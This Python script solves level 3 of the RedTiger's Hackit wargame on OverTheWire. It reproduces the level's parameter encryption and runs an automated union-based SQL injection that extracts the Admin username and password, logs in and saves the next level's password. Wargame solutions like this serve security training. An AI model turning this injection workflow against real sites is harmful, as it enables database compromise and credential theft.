#!/usr/bin/env python3
import pickle
import tigers as tg
import subprocess
import base64
from os import system
import subprocess


def encrypt_python(cryptstr: str):
    '''
    encryption function for level 3
    the original code has been rewritten to python 3
    the sequence of random numbers corresponds to 
    the output of the function $srd = rand(0, 255); 
    for srand(3284724) php 5.x;
    '''
    cryptedstr = ""
    rand_num = [107, 183, 99, 223, 226, 137, 255, 56, 162, 1, 221,
                252, 41, 207, 127, 101, 223, 97, 157, 106, 13, 235,
                223, 247, 100, 218, 174, 252, 133, 76, 181, 240, 4,
                24, 208, 230, 162, 207, 30, 68, 208, 252, 65, 250,
                204, 192, 96, 171, 34, 254, 22, 48, 234, 246, 40,
                78, 208, 215, 74, 86, 35, 255, 71, 39, 24, 23, 14,
                187, 231, 45, 255, 184, 42, 65, 178, 246, 2, 19,
                162, 37, 18, 185, 85, 252, 175, 125, 74, 128, 84,
                149, 214, 120, 149, 29, 160, 174, 52, 175, 105, 28]

    for i in range(len(cryptstr)):
        srd = rand_num[i]
        temp = str(ord(cryptstr[i]) ^ srd)
        while len(temp) < 3:
            temp = "0" + temp

        cryptedstr += temp

    return (base64.b64encode(cryptedstr.encode("ascii"))).decode("utf-8")


def encrypt_php(cryptstr: str):
    '''
    encryption function for level 3
    requires php 5.x
    reproduces the code from view-source:https://redtiger.labs.overthewire.org/urlcrypt.inc
    '''
    result = subprocess.run(
        ['php', '-f', 'tiger3.php', cryptstr],    # program and arguments
        stdout=subprocess.PIPE,  # capture stdout
        check=True               # raise exception if program fails
    )
    cryptstr = result.stdout
    return(cryptstr.decode("utf-8"))


def main():
    base_name = 'level3_users'
    url = "https://redtiger.labs.overthewire.org/level3.php"
    finds = ['username', 'password']  # what we are finding
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level3login' not in cooks:
            print('use prevision level')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    cook = dict(level3login=cooks['level3login'])

    # Search for warnings
    param = {'usr[]': ''}
    war = tg.find_error(url, param, cook)
    print(war)

    # Check php version
    try:
        fun = encrypt_python
        system('php --version > version.txt')
        with open('version.txt', 'rt') as v:
            content = v.read(5)
            print(content)
            if content[4] == 5:
                fun = encrypt_php
    except:
        print('version php not found')

    # Counting the number of columns
    columns = tg.count_columns(url, "' order by %s #", 'usr', cook, fun)
    list_of_columns = [str(c + 1) for c in range(columns)]

    # Search for visible columns
    list_of_visible, html_visible = tg.find_visible_columns(
        url, len(list_of_columns),
        f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin'#",
        'usr', 'MDQyMjExMDE0MTgyMTQw', cook, fun)

    # Search for the desired data
    if len(finds) <= len(list_of_visible):
        for i, f in enumerate(finds):
            list_of_columns[int(list_of_visible[i]) - 1] = f
    else:
        print('too small visible list')
        exit(1)
    keys = tg.find_param(url, len(finds), html_visible,
                         f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin' #", 'usr', cook, fun)

    # Authorization
    data = dict(user=keys[0], password=keys[1], login='Login')
    response = tg.get_request(url, data, cook, method='post')

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)

    # Save cookie
    if ('level4login' not in cooks) or (cooks['level4login'] != passw):
        cooks['level4login'] = passw
        tg.save_cookies(cooks)


if __name__ == '__main__':
    main()
